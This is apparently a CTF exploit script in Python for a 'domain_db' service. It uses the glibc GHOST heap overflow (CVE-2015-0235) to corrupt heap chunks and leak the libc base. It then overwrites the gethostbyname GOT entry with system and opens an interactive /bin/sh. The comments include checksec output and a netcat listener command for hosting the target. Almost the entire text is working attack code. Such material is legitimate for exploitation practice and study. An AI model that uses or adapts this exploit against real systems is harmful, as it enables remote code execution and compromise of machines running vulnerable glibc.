from zio import *
import sys,os,subprocess,time


'''
    checksec  --file domain_db
            RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
            Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   domain_db

    note:
            http://libcdb.com/search?symbolA=__libc_start_main&addressA=0xf7e513e0&symbolB=setsockopt&addressB=0xf7f246d0

            
            libc info:
                Operating System:
                    Ubuntu Linux
                type:
                    ELF
                architecture:
                    x86
                download:
                    libc-2.15_1.so


    run:
        export LD_PRELOAD=/root/Desktop/IMDB/libc.so.6
        while true;do nc -vv -l -p 10001 -e ./domain_db;killall -s 9 domain_db;done


    reference:
        http://www.openwall.com/lists/oss-security/2015/01/27/9
        
'''

def exploit(host):
    io = None
    try:
        io = zio(host, timeout=1000, print_read=False, print_write=False)
        if not io :
            raise Exception
    except:
        print 'can\'t  caonnect server!'
        exit(0)


    def add_domain(name):
        assert  len(name) < 0x800
        io.read_until('>')
        io.writeline('1')
        io.writeline(name)

    def edit_domain(id, name):
        assert  len(name) < 0x800
        io.read_until('>')
        io.writeline('2')
        io.writeline(str(id))
        io.writeline(name)

    def remove_domain(id):
        io.read_until('>')
        io.writeline('3')
        io.writeline(str(id))

    def list_domain():
        io.read_until('>')
        io.writeline('4')

    def lookup_domain(id):
        io.read_until('>')
        io.writeline('5')
        io.writeline(str(id))

    #leak heap base
    def leak_heap():
        pass
    #leak libc base
    def leak_libc():
        pass


    fake_size = l16(0x3031)
    ghost_size  = 0x400 - 16*1 - 4*2

    chunk_0 = '0' * ghost_size + fake_size
    add_domain(chunk_0)
    
    chunk_1 = '1'* (0x400 - 0x88)
    add_domain(chunk_1)


    # if P->fd_nextsize != NULL ; then will do the below checking for large bins unlinking:  
    #   1. victim->fd_nextsize->bk_nextsize == victim  
    #   2. victim->bk_nextsize->fd_nextsize == victim
    fd_next_large_size = '\x00\x00\x00\x00'     # set to NULL that will go pass the safe-unlink checking
    chunk_2 = '2222' + '2222' + fd_next_large_size + '2222' + '2' * (0x20 - 4*4)
    add_domain(chunk_2)

    # chunk_3 will be overwritten by chunk_5
    chunk_3 = '3'* 0x20
    add_domain(chunk_3)

    # free chunk_1 :
    #    the 0x400 bytes heap buffer that was allocated by gethostnamebyhost 
    # will take replace of the one which chunk_1 deallocated!
    remove_domain(1)

    # free chunk_2
    remove_domain(2)

    # overwite the size field of chunk_2
    lookup_domain(0)

    # just for  chunk padding
    chunk_4 = '4'* 0x20
    add_domain(chunk_4)


    # read_where_what
    gethost_got = 0x804B034
    read_where = l32(gethost_got)
    chunk_5 =  '5'*0x28 + read_where
    add_domain(chunk_5)                     # overwrite chunk_3
    
    # leakage libc info
    list_domain()
    io.read_until('<3> ')
    gethostbyname = l32(io.read(4))
    print '[+] gethostbyname\t@\t{0}'.format(hex(gethostbyname))
    libc_base = gethostbyname - 0x1020c0    #remote
    print '[+] libc_base\t\t@\t{0}'.format(hex(libc_base))
    system = libc_base + 0x3d170            
    print '[+] system\t\t@\t{0}'.format(hex(system))

    # write_where_what
    write_what = l32(system)
    edit_domain(3, write_what)  # update chunk_3 for overwritting the value of gethostbyname_got  with system 
    

    # get shell
    cmd = '/bin/sh'
    add_domain(cmd)
    lookup_domain(4)    # call gethostbyname but system


    io.writeline('id')
    io.interact()


if __name__ == '__main__':
  host  = ('127.0.0.1',10001)
  exploit(host)
    

